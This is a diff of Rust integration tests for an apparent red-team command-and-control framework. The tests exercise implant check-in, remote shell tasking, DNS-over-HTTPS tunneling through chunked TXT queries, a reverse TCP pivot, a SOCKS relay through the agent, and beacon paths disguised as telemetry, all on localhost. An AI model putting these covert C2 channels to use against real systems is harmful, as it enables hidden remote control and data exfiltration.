@@ -38,6 +38,10 @@ async fn checkin_then_shell_task_roundtrips() {
         work_dir: work.path().to_path_buf(),
         beacon_uri: "/beacon".into(),
         profile: None,
+        channel: nyx_agent_dev::BeaconChannelKind::Https,
+        doh_server: String::new(),
+        doh_domain: String::new(),
+        impersonate: None,
     };
     let agent = std::thread::spawn(move || nyx_agent_dev::run(cfg));
 
@@ -140,6 +144,10 @@ async fn upload_then_download_roundtrips() {
         work_dir: work.path().to_path_buf(),
         beacon_uri: "/beacon".into(),
         profile: None,
+        channel: nyx_agent_dev::BeaconChannelKind::Https,
+        doh_server: String::new(),
+        doh_domain: String::new(),
+        impersonate: None,
     };
     let work_path = work.path().to_path_buf();
     let agent = std::thread::spawn(move || nyx_agent_dev::run(cfg));
@@ -299,6 +307,10 @@ async fn malleable_beacon_uri_roundtrips() {
         beacon_uri: "/api/v1/Telemetry".into(),
         // The agent gets the same profile so it can invert the server envelope.
         profile: Some(profile),
+        channel: nyx_agent_dev::BeaconChannelKind::Https,
+        doh_server: String::new(),
+        doh_domain: String::new(),
+        impersonate: None,
     };
     let agent = std::thread::spawn(move || nyx_agent_dev::run(cfg));
 
@@ -521,6 +533,10 @@ async fn scripting_events_fire_on_beacon_cycle() {
         work_dir: work.path().to_path_buf(),
         beacon_uri: "/beacon".into(),
         profile: None,
+        channel: nyx_agent_dev::BeaconChannelKind::Https,
+        doh_server: String::new(),
+        doh_domain: String::new(),
+        impersonate: None,
     };
     let agent = std::thread::spawn(move || nyx_agent_dev::run(cfg));
 
@@ -694,6 +710,10 @@ async fn profile_output_transform_envelope_roundtrips() {
         work_dir: work.path().to_path_buf(),
         beacon_uri: "/api/v1/Telemetry".into(),
         profile: Some(profile),
+        channel: nyx_agent_dev::BeaconChannelKind::Https,
+        doh_server: String::new(),
+        doh_domain: String::new(),
+        impersonate: None,
     };
     let agent = std::thread::spawn(move || nyx_agent_dev::run(cfg));
 
@@ -767,5 +787,584 @@ where
             return None;
         }
         tokio::time::sleep(Duration::from_millis(200)).await;
+    }
+}
+
+// ---- DoH DNS channel (spec-2): HTTP JSON /dns-query path -------------------
+//
+// Upload a sealed check-in frame through the RFC 8484 JSON endpoint exactly
+// like DohDnsTransport would (chunked TXT queries), then poll task.{domain}
+// for the sealed reply. Proves the authoritative responder is mounted on the
+// axum router and the chunk→session→reply funnel works over HTTP.
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn doh_http_chunk_upload_then_task_poll_roundtrips() {
+    use base64::engine::general_purpose::URL_SAFE_NO_PAD as B64;
+    use base64::Engine;
+    use nyx_protocol::{
+        encode_frame_dir, open_frame_dir, wire::Writer, Direction, ImplantKeypair, SessionInfo,
+    };
+
+    let state = Arc::new(AppState {
+        doh: Some(nyx_server::dns_responder::DohState::new("c2.test".into())),
+        ..AppState::default()
+    });
+    let server_pub = state.keypair.public_bytes();
+    let app = router(state);
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let url = format!("http://{addr}");
+    tokio::spawn(async move {
+        let _ = axum::serve(
+            listener,
+            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
+        )
+        .await;
+    });
+    tokio::time::sleep(Duration::from_millis(150)).await;
+
+    // Seal a check-in frame.
+    let ikp = ImplantKeypair::generate().unwrap();
+    let pubkey = ikp.public_bytes();
+    let key = ikp.session_key(&server_pub).unwrap();
+    let mut w = Writer::new();
+    SessionInfo {
+        beacon_id: 9,
+        hostname: "doh-http-host".into(),
+        username: "tester".into(),
+        os: "linux".into(),
+        arch: 2,
+        pid: 99,
+        is_admin: 0,
+        auth_token: None,
+    }
+    .encode(&mut w)
+    .unwrap();
+    let frame =
+        encode_frame_dir(&pubkey, Direction::ClientToServer, 0, &key, &w.into_bytes()).unwrap();
+
+    // Upload the chunks via POST /dns-query (JSON, dns-json content type).
+    for (i, chunk) in frame.chunks(160).enumerate() {
+        let b64 = B64.encode(chunk);
+        let mut labels: Vec<&str> = Vec::new();
+        let mut rest = b64.as_str();
+        while !rest.is_empty() {
+            let split = rest.len().min(63);
+            labels.push(&rest[..split]);
+            rest = &rest[split..];
+        }
+        let name = format!("c0-{i}.{}.c2.test", labels.join("."));
+        let body = serde_json::json!({ "name": name, "type": 16 });
+        let resp: serde_json::Value = ureq::post(format!("{url}/dns-query").as_str())
+            .set("Content-Type", "application/dns-json")
+            .send_json(body)
+            .expect("dns-query POST")
+            .into_json()
+            .expect("dns-query JSON");
+        assert_eq!(resp["Status"], 0, "chunk upload must return Status 0");
+    }
+
+    // Poll task.c2.test until the sealed reply arrives.
+    let reply = poll_until(Duration::from_secs(10), || async {
+        let body = serde_json::json!({ "name": "task.c2.test", "type": 16 });
+        let resp: serde_json::Value = ureq::post(format!("{url}/dns-query").as_str())
+            .set("Content-Type", "application/dns-json")
+            .send_json(body)
+            .ok()?
+            .into_json()
+            .ok()?;
+        let data = resp
+            .get("Answer")
+            .and_then(|a| a.as_array())
+            .and_then(|arr| arr.first())
+            .and_then(|rr| rr["data"].as_str())?;
+        let frame = B64.decode(data).ok()?;
+        Some(frame)
+    })
+    .await
+    .expect("no reply via task.c2.test poll");
+
+    // The reply must be a valid server→client frame for our session.
+    let raw = nyx_protocol::parse_frame(&reply).expect("reply parses as a frame");
+    assert_eq!(raw.pubkey, pubkey);
+    open_frame_dir(&key, Direction::ServerToClient, &raw).expect("reply opens with session key");
+
+    // health.c2.test A canary answers too.
+    let body = serde_json::json!({ "name": "health.c2.test", "type": 1 });
+    let resp: serde_json::Value = ureq::post(format!("{url}/dns-query").as_str())
+        .set("Content-Type", "application/dns-json")
+        .send_json(body)
+        .expect("health query")
+        .into_json()
+        .expect("health JSON");
+    assert_eq!(resp["Status"], 0);
+}
+
+// ---- TCP pivot channel (spec-3): reverse_tcp parent -------------------------
+//
+// The implant child connects out, sends one length-prefixed frame, reads the
+// reply, closes. This test drives the server-side parent exactly like the
+// child's send_recv would.
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn tcp_pivot_reverse_tcp_roundtrips() {
+    use nyx_protocol::{
+        encode_frame_dir, open_frame_dir, wire::Writer, Direction, ImplantKeypair, SessionInfo,
+    };
+
+    let state = Arc::new(AppState::default());
+    let server_pub = state.keypair.public_bytes();
+
+    // Mount the pivot listener on an ephemeral port and serve connections
+    // with the module's per-connection path (same code spawn() uses).
+    let pivot = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let pivot_addr = pivot.local_addr().unwrap();
+    let pivot_state = state.clone();
+    tokio::spawn(async move {
+        loop {
+            let (stream, peer) = pivot.accept().await.unwrap();
+            let st = pivot_state.clone();
+            tokio::spawn(async move {
+                let _ = nyx_server::tcp_pivot::serve_connection(&st, stream, peer).await;
+            });
+        }
+    });
+
+    // Seal a check-in frame like the implant child would.
+    let ikp = ImplantKeypair::generate().unwrap();
+    let pubkey = ikp.public_bytes();
+    let key = ikp.session_key(&server_pub).unwrap();
+    let mut w = Writer::new();
+    SessionInfo {
+        beacon_id: 11,
+        hostname: "tcp-pivot-host".into(),
+        username: "tester".into(),
+        os: "windows".into(),
+        arch: 0,
+        pid: 111,
+        is_admin: 1,
+        auth_token: None,
+    }
+    .encode(&mut w)
+    .unwrap();
+    let frame =
+        encode_frame_dir(&pubkey, Direction::ClientToServer, 0, &key, &w.into_bytes()).unwrap();
+
+    // Child transaction: connect, write [4B LE len][frame], read reply.
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let mut sock = tokio::net::TcpStream::connect(pivot_addr).await.unwrap();
+    let mut out = Vec::with_capacity(4 + frame.len());
+    out.extend_from_slice(&(frame.len() as u32).to_le_bytes());
+    out.extend_from_slice(&frame);
+    sock.write_all(&out).await.unwrap();
+
+    let mut len_buf = [0u8; 4];
+    tokio::time::timeout(Duration::from_secs(5), sock.read_exact(&mut len_buf))
+        .await
+        .expect("reply length prefix timeout")
+        .unwrap();
+    let reply_len = u32::from_le_bytes(len_buf) as usize;
+    let mut reply = vec![0u8; reply_len];
+    tokio::time::timeout(Duration::from_secs(5), sock.read_exact(&mut reply))
+        .await
+        .expect("reply body timeout")
+        .unwrap();
+
+    // The reply must be a valid server→client frame for our session.
+    let raw = nyx_protocol::parse_frame(&reply).expect("reply parses as a frame");
+    assert_eq!(raw.pubkey, pubkey);
+    open_frame_dir(&key, Direction::ServerToClient, &raw).expect("reply opens with session key");
+
+    // The session registry must contain the new session (peer = pivot conn).
+    assert!(state.sessions.contains_key(&pubkey));
+}
+
+// ---- DoH channel full beacon loop (spec-2) ----------------------------------
+//
+// The dev agent beacons over DoH DNS (channel=Doh, DohDnsTransport against the
+// server's /dns-query responder): check-in → task → shell output, all over
+// chunked TXT queries + task.{domain} polls. This is the end-to-end proof that
+// the DNS channel is wired: client transport, authoritative responder, and the
+// standard beacon funnel all work together.
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn doh_agent_full_beacon_loop_roundtrips() {
+    let state = AppState {
+        api_token: Some("test-admin-token".to_string()),
+        doh: Some(nyx_server::dns_responder::DohState::new("c2.test".into())),
+        ..AppState::default()
+    };
+    let state = Arc::new(state);
+    let server_pub = state.keypair.public_bytes();
+    let app = router(state);
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let url = format!("http://{addr}");
+    tokio::spawn(async move {
+        let _ = axum::serve(
+            listener,
+            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
+        )
+        .await;
+    });
+    tokio::time::sleep(Duration::from_millis(150)).await;
+
+    let work = tempfile::tempdir().expect("tempdir");
+    let cfg = nyx_agent_dev::Config {
+        server_url: url.clone(),
+        server_pub,
+        sleep_seconds: 1,
+        jitter_pct: 0,
+        work_dir: work.path().to_path_buf(),
+        beacon_uri: "/beacon".into(),
+        profile: None,
+        channel: nyx_agent_dev::BeaconChannelKind::Doh,
+        doh_server: format!("{url}/dns-query"),
+        doh_domain: "c2.test".into(),
+        impersonate: None,
+    };
+    let agent = std::thread::spawn(move || nyx_agent_dev::run(cfg));
+
+    // 1. wait for the agent to check in (over DNS).
+    let session = poll_until(Duration::from_secs(20), || async {
+        let list: serde_json::Value = ureq::get(format!("{url}/api/sessions").as_str())
+            .set("Authorization", "Bearer test-admin-token")
+            .call()
+            .ok()?
+            .into_json()
+            .ok()?;
+        let arr = list.as_array()?;
+        arr.first()?["id"].as_str().map(|s| s.to_string())
+    })
+    .await
+    .expect("doh agent never checked in");
+
+    // 2. queue a shell task.
+    let body = serde_json::json!({
+        "session": session,
+        "command": { "type": "shell", "args": "echo doh-wired-ok" },
+    });
+    let ack: serde_json::Value = ureq::post(format!("{url}/api/task").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(body)
+        .expect("enqueue task")
+        .into_json()
+        .expect("task ack json");
+    let task_id = ack["task_id"].as_u64().expect("task_id in ack");
+
+    // 3. poll results until the shell output arrives (over DNS).
+    let output = poll_until(Duration::from_secs(30), || async {
+        let rs: serde_json::Value = ureq::get(format!("{url}/api/results").as_str())
+            .set("Authorization", "Bearer test-admin-token")
+            .query("session", &session)
+            .call()
+            .ok()?
+            .into_json()
+            .ok()?;
+        let arr = rs.as_array()?;
+        arr.iter().find_map(|r| {
+            if r["task_id"] == task_id && r["kind"] == "output" {
+                r["text"].as_str().map(|s| s.to_string())
+            } else {
+                None
+            }
+        })
+    })
+    .await
+    .expect("no shell output via DoH channel");
+    assert!(
+        output.contains("doh-wired-ok"),
+        "unexpected output: {output:?}"
+    );
+
+    // Send exit so the agent terminates, then join with a bound.
+    let exit = serde_json::json!({ "session": session, "command": { "type": "exit" } });
+    let _ = ureq::post(format!("{url}/api/task").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(exit);
+    let join = tokio::task::spawn_blocking(move || agent.join());
+    let _ = tokio::time::timeout(Duration::from_secs(15), join).await;
+}
+
+// ---- SOCKS relay full chain (pivot): operator → server → agent → socket ---
+//
+// The dev agent now hosts a real relay channel table (agent-dev/src/pivot.rs,
+// std port of the implant's): Connect opens a socket, ChannelData writes to
+// it, and pump_channels drains socket→operator data each cycle. This test
+// drives the ENTIRE chain through the control API: connect to a local echo
+// server, send bytes, receive the echoed bytes back as a Channel result.
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn socks_relay_full_chain_roundtrips() {
+    let state = Arc::new(AppState {
+        api_token: Some("test-admin-token".to_string()),
+        ..AppState::default()
+    });
+    let server_pub = state.keypair.public_bytes();
+    let app = router(state);
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let url = format!("http://{addr}");
+    tokio::spawn(async move {
+        let _ = axum::serve(
+            listener,
+            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
+        )
+        .await;
+    });
+    tokio::time::sleep(Duration::from_millis(150)).await;
+
+    let work = tempfile::tempdir().expect("tempdir");
+    let cfg = nyx_agent_dev::Config {
+        server_url: url.clone(),
+        server_pub,
+        sleep_seconds: 1,
+        jitter_pct: 0,
+        work_dir: work.path().to_path_buf(),
+        beacon_uri: "/beacon".into(),
+        profile: None,
+        channel: nyx_agent_dev::BeaconChannelKind::Https,
+        doh_server: String::new(),
+        doh_domain: String::new(),
+        impersonate: None,
+    };
+    let agent = std::thread::spawn(move || nyx_agent_dev::run(cfg));
+
+    let session = poll_until(Duration::from_secs(10), || async {
+        let list: serde_json::Value = ureq::get(format!("{url}/api/sessions").as_str())
+            .set("Authorization", "Bearer test-admin-token")
+            .call()
+            .ok()?
+            .into_json()
+            .ok()?;
+        let arr = list.as_array()?;
+        arr.first()?["id"].as_str().map(|s| s.to_string())
+    })
+    .await
+    .expect("agent never checked in");
+
+    // A local echo server: reads 4 bytes, writes "pong".
+    let echo = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let echo_port = echo.local_addr().unwrap().port();
+    let echo_thread = std::thread::spawn(move || {
+        let (mut sock, _) = echo.accept().unwrap();
+        let mut buf = [0u8; 4];
+        use std::io::{Read, Write};
+        sock.read_exact(&mut buf).unwrap();
+        sock.write_all(b"pong").unwrap();
+        std::thread::sleep(Duration::from_millis(50));
+    });
+
+    // 1. Connect: server assigns the chan id.
+    let body = serde_json::json!({
+        "session": session,
+        "command": { "type": "connect", "host": "127.0.0.1", "port": echo_port },
+    });
+    let ack: serde_json::Value = ureq::post(format!("{url}/api/task").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(body)
+        .expect("enqueue connect")
+        .into_json()
+        .expect("connect ack json");
+    let chan = ack["chan"].as_u64().expect("chan in ack") as u32;
+
+    // 2. Wait for the open ack (kind=channel, "<chan N#0>").
+    poll_until(Duration::from_secs(15), || async {
+        let rs: serde_json::Value = ureq::get(format!("{url}/api/results").as_str())
+            .set("Authorization", "Bearer test-admin-token")
+            .query("session", &session)
+            .call()
+            .ok()?
+            .into_json()
+            .ok()?;
+        let arr = rs.as_array()?;
+        arr.iter()
+            .any(|r| r["kind"] == "channel" && r["text"] == format!("<chan {chan}#0>"))
+            .then_some(())
+    })
+    .await
+    .expect("connect never opened a channel on the agent");
+
+    // 3. Send data through the relay.
+    let body = serde_json::json!({
+        "session": session,
+        "command": { "type": "channeldata", "chan": chan, "data_hex": hex::encode(b"ping") },
+    });
+    let _: serde_json::Value = ureq::post(format!("{url}/api/task").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(body)
+        .expect("enqueue channeldata")
+        .into_json()
+        .expect("channeldata ack json");
+
+    // 4. The echoed bytes come back as a Channel result (status 1, hex data).
+    let echoed = poll_until(Duration::from_secs(15), || async {
+        let rs: serde_json::Value = ureq::get(format!("{url}/api/results").as_str())
+            .set("Authorization", "Bearer test-admin-token")
+            .query("session", &session)
+            .call()
+            .ok()?
+            .into_json()
+            .ok()?;
+        let arr = rs.as_array()?;
+        arr.iter().find_map(|r| {
+            if r["kind"] == "channel" && r["text"] == format!("<chan {chan}#1>") {
+                r["data_hex"].as_str().map(|s| s.to_string())
+            } else {
+                None
+            }
+        })
+    })
+    .await
+    .unwrap_or_else(|| {
+        // Diagnostic: dump every result so a wiring failure is visible.
+        let rs: serde_json::Value = ureq::get(format!("{url}/api/results").as_str())
+            .set("Authorization", "Bearer test-admin-token")
+            .query("session", &session)
+            .call()
+            .unwrap()
+            .into_json()
+            .unwrap();
+        panic!("no echoed bytes via relay; results so far: {rs:?}");
+    });
+    assert_eq!(
+        hex::decode(&echoed).expect("hex data"),
+        b"pong",
+        "relay must deliver the echo server's reply"
+    );
+
+    // 5. Teardown: close the channel, then exit the agent.
+    let body = serde_json::json!({
+        "session": session,
+        "command": { "type": "channelclose", "chan": chan },
+    });
+    let _ = ureq::post(format!("{url}/api/task").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(body);
+    let exit = serde_json::json!({ "session": session, "command": { "type": "exit" } });
+    let _ = ureq::post(format!("{url}/api/task").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(exit);
+    let join = tokio::task::spawn_blocking(move || {
+        let _ = echo_thread.join();
+        agent.join()
+    });
+    let _ = tokio::time::timeout(Duration::from_secs(10), join).await;
+}
+
+// ---- Collaboration API (M3): ownership + roster + report ---------------------
+
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn ownership_roster_and_report_roundtrip() {
+    use nyx_protocol::{encode_frame_dir, wire::Writer, Direction, ImplantKeypair, SessionInfo};
+
+    let state = Arc::new(AppState {
+        api_token: Some("test-admin-token".to_string()),
+        ..AppState::default()
+    });
+    let server_pub = state.keypair.public_bytes();
+    let app = router(state);
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    let url = format!("http://{addr}");
+    tokio::spawn(async move {
+        let _ = axum::serve(
+            listener,
+            app.into_make_service_with_connect_info::<std::net::SocketAddr>(),
+        )
+        .await;
+    });
+    tokio::time::sleep(Duration::from_millis(150)).await;
+
+    // Register a session directly via the beacon path (no agent needed).
+    let ikp = ImplantKeypair::generate().unwrap();
+    let pubkey = ikp.public_bytes();
+    let key = ikp.session_key(&server_pub).unwrap();
+    let mut w = Writer::new();
+    SessionInfo {
+        beacon_id: 5,
+        hostname: "collab-host".into(),
+        username: "tester".into(),
+        os: "linux".into(),
+        arch: 2,
+        pid: 5,
+        is_admin: 0,
+        auth_token: None,
+    }
+    .encode(&mut w)
+    .unwrap();
+    let frame =
+        encode_frame_dir(&pubkey, Direction::ClientToServer, 0, &key, &w.into_bytes()).unwrap();
+    ureq::post(format!("{url}/beacon").as_str())
+        .send_bytes(&frame)
+        .expect("beacon check-in");
+    let session = hex::encode(pubkey);
+
+    // 1. Assign an owner.
+    let body = serde_json::json!({ "session": session, "owner": "alice" });
+    let resp: serde_json::Value = ureq::post(format!("{url}/api/session/owner").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(body)
+        .expect("set owner")
+        .into_json()
+        .expect("owner ack");
+    assert_eq!(resp["ok"], true);
+
+    // 2. Sessions list reflects the owner.
+    let list: serde_json::Value = ureq::get(format!("{url}/api/sessions").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .call()
+        .expect("list sessions")
+        .into_json()
+        .expect("sessions json");
+    let view = list
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|s| s["id"] == session)
+        .expect("session in list");
+    assert_eq!(view["owner"], "alice");
+
+    // 3. Clearing ownership works.
+    let body = serde_json::json!({ "session": session, "owner": null });
+    let _: serde_json::Value = ureq::post(format!("{url}/api/session/owner").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .send_json(body)
+        .expect("clear owner")
+        .into_json()
+        .expect("clear ack");
+
+    // 4. Operator roster (empty in open mode).
+    let roster: serde_json::Value = ureq::get(format!("{url}/api/operators").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .call()
+        .expect("operators")
+        .into_json()
+        .expect("operators json");
+    assert!(roster.as_array().is_some());
+
+    // 5. Report contains the session row.
+    let report = ureq::get(format!("{url}/api/report").as_str())
+        .set("Authorization", "Bearer test-admin-token")
+        .call()
+        .expect("report")
+        .into_string()
+        .expect("report body");
+    assert!(report.contains("# Nyx engagement report"), "report header");
+    assert!(report.contains("collab-host"), "report lists sessions");
+    assert!(report.contains("Credential vault"), "report vault section");
+    assert!(report.contains("Audit tail"), "report audit section");
+
+    // 6. Viewer cannot assign ownership.
+    let body = serde_json::json!({ "session": session, "owner": "eve" });
+    match ureq::post(format!("{url}/api/session/owner").as_str()).send_json(body) {
+        // Token-configured server: anonymous is denied at the auth gate (401).
+        // Open-mode server: anonymous maps to Viewer and the route denies (403).
+        Err(ureq::Error::Status(401, _)) | Err(ureq::Error::Status(403, _)) => {}
+        other => panic!("anonymous must be denied, got: {other:?}"),
     }
 }
